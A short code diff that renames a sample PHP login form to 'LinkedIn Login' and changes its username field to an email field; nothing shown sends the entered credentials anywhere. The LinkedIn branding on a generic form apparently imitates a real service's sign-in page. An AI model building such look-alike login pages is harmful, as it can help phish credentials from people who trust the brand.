@@ -138,12 +138,12 @@ header("location: user.php");
     <!-- REGISTER
     –––––––––––––––––––––––––––––––––––––––––––––––––– -->
     <div id="main">
-	<h1>PHP Login Session Example</h1>
+	<h1>LinkedIn Login</h1>
 	<div id="login">
-	<h2>Login Form</h2>
+	<h2>Login Window</h2>
 	<form action="" method="post">
 	<label>UserName :</label>
-	<input id="name" name="username" placeholder="username" type="text">
+	<input id="email" name="email" placeholder="Email" type="text">
 	<label>Password :</label>
 	<input id="password" name="password" placeholder="**********" type="password">
 	<input name="submit" type="submit" value=" Login ">
